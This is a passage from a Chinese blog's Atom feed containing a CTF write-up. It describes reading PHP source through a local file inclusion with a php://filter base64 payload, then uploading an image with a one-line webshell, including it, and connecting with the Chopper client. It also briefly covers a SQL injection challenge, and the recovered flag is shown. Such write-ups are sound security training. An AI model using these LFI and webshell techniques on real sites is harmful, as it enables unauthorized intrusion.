src="http://qiniuyun.zzqsmile.top/blog/180925/6BA8iHImcG.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>读取<code>upload.php</code>文件源码</li></ul><p><strong>读取格式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件名</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/GKidJmj9ek.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><strong>然后base64解码</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/0Cad66DjkC.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>此时看到<code>upload.php</code>源码，可知文件上传拿webshell是行不通的</p></blockquote><ul><li>同样读取<code>index.php</code>，如下：</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/LFmmaD9jJL.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><strong>然后base64解码</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/EhC0jf4Ck0.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>可以看出，此文件包含是对包含文件参数<code>file</code>是做了正则匹配过滤的。</p></blockquote><p><strong>解题</strong></p><ul><li>上传图片<code>zzqsmile.jpg</code>，然后抓包写一句话。</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/GH8DcghaKE.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>上传成功！</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/gbFLm573a8.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>然后包含上传的图片<code>upload/zzqsmile.jpg</code>，如下：</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/KmGL6C7eHI.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>ok!下面就可以用菜刀尝试连接了。</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/4390187jeD.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>nice! 没毛病！</p></blockquote><ul><li>最后就简单了，找<code>flag</code>。</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/hLJ4fDDcf4.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>flag: flag{pHp_Lfi_t0_Be_Shell!} 之前读文件读的就是这个文件。</p></blockquote><hr><h4 id="2-SQL注入拿flag"><a href="#2-SQL注入拿flag" class="headerlink" title="2.SQL注入拿flag"></a>2.SQL注入拿<code>flag</code></h4><ul><li>题目地址： <a href="http://ctf.xjnu.edu.cn:9900/web10/">http://ctf.xjnu.edu.cn:9900/web10/</a></li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/AhFjkG491i.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>题目分析： 很明显根据提示信息，此题是道SQL注入的题目，可以看下源码，或者直接可以尝试<code>index.php?id=1</code>。</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/FAai1bbceL.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/a7ah5AGLLk.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>可以发现，此处可能就是注入点，经确认的确存在注入。</p></blockquote><ul><li>下面就是sql注入流程一顿操作，最后得到<code>flag</code>。</li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/0jfjG4Hm1c.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>解题完毕！</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;闲来无事，最近在做CTF题，感觉再不练练手我就废了。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://zzqsmile.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://zzqsmile.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
